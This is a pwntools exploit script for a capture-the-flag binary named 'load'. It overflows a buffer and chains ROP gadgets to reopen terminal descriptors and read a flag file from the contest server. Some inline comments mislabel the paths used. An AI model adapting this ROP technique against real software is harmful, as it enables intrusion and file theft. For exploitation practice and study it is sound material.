#!/usr/bin/python
from pwn import *
import sys
#sys.path.append('/home/lord_idiot/CTF-Tools/python-libs')

HOST = "pwn1.chal.ctf.westerns.tokyo"
PORT = 34835

def rdi(a):
	return p64(0x400a73) + p64(a)

def rsi(a):
	return p64(0x400a71) + p64(a) + p64(0xdeadbeef)

def rdx(a): #rbp must be 1
	out = p64(0x400a6b) #pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
	out += p64(1)
	out += p64(0x600FC0) # GOT_close
	out += p64(a)
	out += p64(0x1337)*2
	out += p64(0x400A46) #mov rdx, r13
	out += "A"*8*7 # rbx, rbp, r12, r13, r14, r15
	return out

def exploit(r):

	rop = "A"*56
	rop += rdx(0)
	rop += rsi(0x2702)
	rop += rdi(0x601040+len("/proc/self/fd/0\x00")) # "/dev/tty"
	rop += p64(0x400710) # PLT_open

	rop += rdx(0)
	rop += rsi(0x2702)
	rop += rdi(0x601040+len("/proc/self/fd/0\x00")) # "/dev/tty"
	rop += p64(0x400710) # PLT_open

	rop += rdx(0)
	rop += rsi(0)
	rop += rdi(0x601040+len("/proc/self/fd/0\x00" + "/dev/pts/"+sys.argv[1]+"\x00")) # "/etc/passwd"
	rop += p64(0x400710) # PLT_open

	rop += rdx(10000)
	rop += rsi(0x601000)
	rop += rdi(2) # "flag"
	rop += p64(0x4006E8) #PLT_read

	rop += rdi(0x601000)
	rop += p64(0x0000000004006C0)

	#context.log_level = "DEBUG"

	r.sendline( "/proc/self/fd/0\x00" + "/dev/pts/"+sys.argv[1]+"\x00" + "/home/load/flag.txt\x00" )
	r.sendline("0")
	r.sendline(str(len(rop)))
	r.sendline(rop)

	r.interactive()
	return

if __name__ == "__main__":
	elf_name = "./load"
	e = ELF(elf_name)
	
	libc_name = ""
	#libc = ELF(libc_name)

	if sys.argv[-1] == "remote":
		r = remote(HOST, PORT)
		exploit(r)
	else:
		if libc_name != "":
			r = process(elf_name, env={"LD_PRELOAD" : libc_name})
		else:
			r = process(elf_name)
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
